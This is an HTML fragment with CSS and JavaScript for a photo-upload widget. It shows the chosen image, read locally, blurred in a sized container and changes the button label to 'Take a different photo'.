    <style>
        #fileInputLabel {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            cursor: pointer;

            z-index: 1;
            /* Ensure label appears above the image */
        }

        /* Styles for the image container */
        #imageContainer {
            position: relative;
            margin-top: 20px;
            border: 1px solid #ddd;
            padding: 10px;
            max-width: 400px;
            /* Set the maximum width of the image container */
            max-height: 300px;
            /* Set the maximum height of the image container */
            min-width: 200px;
            /* Set the minimum width of the image container */
            min-height: 150px;
            /* Set the minimum height of the image container */
            overflow: hidden;
            /* Ensure the image does not overflow the container */
        }

        /* Styles for the selected image */
        #selectedImage {
            width: 100%;
            /* Ensure the image covers the container's width */
            height: 100%;
            /* Ensure the image covers the container's height */
            object-fit: cover;
            /* Make the image cover the container while preserving aspect ratio */
            filter: blur(3px);
            /* Apply a blur effect to the image */
        }
    </style>

    <script>
        function displaySelectedImage(event) {
            const fileInput = event.target;
            const imageContainer = document.getElementById('imageContainer');
            const selectedImage = document.getElementById('selectedImage');
            const fileInputLabel = document.getElementById('fileInputLabel');

            const file = fileInput.files[0];
            if (file) {
                const reader = new FileReader();

                reader.onload = function () {
                    selectedImage.src = reader.result;
                    selectedImage.style.display = 'block';
                    selectedImage.style.filter = 'blur(3px)'; // Apply the blur effect
                    fileInputLabel.textContent = 'Take a different photo';

                    // Center the label vertically and horizontally in the imageContainer
                    fileInputLabel.style.top = '50%';
                    fileInputLabel.style.left = '50%';
                    fileInputLabel.style.transform = 'translate(-50%, -50%)';
                };

                reader.readAsDataURL(file);
            } else {
                // If no file is selected, clear the displayed image and reset the label text
                selectedImage.src = '';
                selectedImage.style.display = 'none';
                selectedImage.style.filter = 'none'; // Remove the blur effect
                fileInputLabel.textContent = 'Take photo';
                fileInputLabel.style.top = ''; // Reset the label position
                fileInputLabel.style.left = '';
                fileInputLabel.style.transform = '';
            }
        }

        // Add an event listener to the file input to call the displaySelectedImage function
        document.getElementById('fileInput').addEventListener('change', displaySelectedImage);
    </script>
